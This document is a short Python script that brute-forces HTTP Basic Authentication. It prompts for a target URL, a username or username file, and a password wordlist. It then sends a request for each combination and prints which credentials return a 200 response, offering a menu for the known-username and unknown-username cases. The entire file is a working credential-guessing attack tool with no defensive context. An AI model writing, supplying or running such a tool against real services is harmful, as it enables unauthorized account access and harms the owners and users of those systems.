import requests
from requests.auth import HTTPBasicAuth

def password_force():

    url=input("Url: ")
    username=input("Username : ")
    password_file=input("Password File: ")

    with open(password_file,"r") as passwords:
        for password in passwords:
            password=password.strip()

            response=requests.get(url,auth=HTTPBasicAuth(username,password))

            if response.status_code==200:
                print(f"Username= {username} Password= {password} is correct")
                break
            else:
                print(f"Username= {username} Password= {password} is not correct")



def username_and_password():

    url=input("Url: ")
    username_file=input("Username file: ")
    password_file=input("Password File: ")

    with open(username_file,"r") as usernames:
        for username in usernames:
            username=username.strip()


            with open(password_file,"r") as passwords:
                for password in passwords:
                    password=password.strip()

                    response=requests.get(url,auth=HTTPBasicAuth(username,password))

                    if response.status_code==200:
                        print(f"Username= {username} Password= {password} is correct")
                        break
                    else:
                        print(f"Username= {username} Password= {password} is not correct")
                else:
                    continue
                break
            
while True:
    print("1-I know username but not password\n2-I don't know username and password\n3-Exit\n")
    choice=int(input("Choice: "))
    if choice==1:
        password_force()
        break
    elif choice==2:
        username_and_password()
        break
    elif choice==3:
        break
    else:
        print("Invalid choice.Choice 1,2 or 3.\n")